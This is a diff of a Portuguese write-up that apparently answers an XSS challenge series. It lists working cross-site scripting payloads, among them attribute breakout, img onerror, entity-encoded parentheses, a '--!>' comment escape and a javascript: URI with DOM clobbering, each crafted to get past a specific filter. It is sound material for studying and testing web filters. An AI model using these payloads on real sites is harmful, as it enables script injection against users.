@@ -32,6 +32,7 @@ function escape(input) {
 }        
 ```
 Filtro: nenhum (concatenação direta no atributo value).
+
 Resposta: `"><script>prompt(1)</script>`
 
 
@@ -47,6 +48,7 @@ function escape(input) {
 }        
 ```
 Filtro: remoção de <…> ou </…> via regex.
+
 Respota: ```<img src=1 onerror='prompt(1)'```
 
 Usamos o elemento <img> com atributo onerror, que não é capturado pela regex de remoção de tags.
@@ -63,6 +65,7 @@ function escape(input) {
 }        
 ```
 filtro: remoção de = e (.
+
 Resposta: ```<svg><script>prompt&#40;1)</script>```
 
 Para contornar o filtro que remove `=` e `()`, usamos a entidade HTML ```&#40;``` no lugar do parêntese e evitamos o sinal de igual.
@@ -78,6 +81,7 @@ function escape(input) {
 }            
 ```
 Filtro: substitui -> por _, impedindo o término de comentário -->.
+
 Resposta: ```--!><svg/onload=prompt(1)```
 
 Para contornar o filtro (que remove ->), usamos o fechamento alternativo de comentário --!> definido no HTML5, fechamos o comentário e em seguida executamos o vetor SVG.
@@ -94,6 +98,7 @@ function escape(input) {
 }                   
 ```
 Filtro: remove >, qualquer atributo on...= e a palavra focus.
+
 Resposta ```"type=image src onerror
 ="prompt(1) ```
 
@@ -136,6 +141,7 @@ function escape(input) {
 }                         
 ```
 Filtro: bloqueia URIs `javascript:`, `vbscript:`, `data:` em `action`.
+
 Resposta:  ```javascript:prompt(1)#{"action":1}```
 
 Usamos a técnica de DOM clobbering: ao passar `{"action":1}` via JSON, criamos um `<input name="action">`, sobrescrevendo `form.action` para algo seguro que passe no teste e dispare `prompt(1)`.
